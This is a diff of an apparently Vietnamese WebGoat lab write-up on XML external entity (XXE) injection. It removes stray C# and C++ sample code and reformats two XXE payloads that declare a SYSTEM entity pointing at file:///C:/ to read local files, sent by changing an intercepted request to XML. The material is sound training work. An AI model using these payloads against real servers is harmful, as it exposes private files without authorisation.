@@ -7,49 +7,6 @@ date: "26-3-2024"
 id: "17"
 ---
 
-## C#
-
-```csharp
-var client = new HttpClient();
-client.BaseAddress = new Uri("http://example.com/");
-// ACCEPT header
-client.DefaultRequestHeaders.Accept.Add(
-     new MediaTypeWithQualityHeaderValue("application/json"));
-var request = new HttpRequestMessage(HttpMethod.Post, "relativeAddress");
-// CONTENT-TYPE header
-request.Content = new StringContent("{\"name\":\"John Doe\",\"age\":33}",
-                     Encoding.UTF8, "application/json");
-client.SendAsync(request).ContinueWith(responseTask =>
-        Console.WriteLine("Response: {0}", responseTask.Result); );
-
-```
-
-## C++
-
-## C++
-
-```cpp
-
-
-// C++ program to print name
-// as output
-#include <iostream>
-using namespace std;
-
-// Driver code
-int main()
-{
-  string name;
-
-  cout << "Enter the name: ";
-  cin >> name;
-
-  cout << "Entered name is: " <<
-           name;
-    return 0;
-}
-```
-
 - XXE (XML external entity) hay tấn công thực thể bên ngoài XML là lỗ hổng lợi dụng tính năng phân tích cú pháp của XML dùng để phân tích cú pháp đầu vào XML từ người dùng. Từ đó kẻ tấn công có thể truy cập đến các tệp cục bộ, chạy các lệnh, quét các dịch vụ và các cổng nội bộ, truy cập mạng nội bộ, từ đó có thể thực hiện 1 cuộc tấn công DOS đến máy chủ dễ bị khai thác
 
 ## 1. Let's try
@@ -66,7 +23,11 @@ int main()
 - Thay đổi XML trong Request theo code bên dưới và nhấn Forward.
 
 ```xml
-<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///C:/">]><comment>  <text>&xxe;</text></comment>
+<?xml version="1.0"?>
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///C:/">]>
+<comment>
+   <text>&xxe;</text>
+</comment>
 ```
 
 ![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1711419324/WebGoat/H69_ww9c7b.png)
@@ -89,7 +50,11 @@ int main()
 - Thay đổi `application/json` trở thành `application/xml`, và thêm đoạn code XML bên dưới, sau đó nhấn Forward:
 
 ```xml
-<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///C:/">]><comment>  <text> &xxe;</text></comment>
+<?xml version="1.0"?>
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///C:/">]>
+<comment>
+   <text> &xxe;</text>
+</comment>
 ```
 
 ![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1711419325/WebGoat/H73_ygsmoa.png)
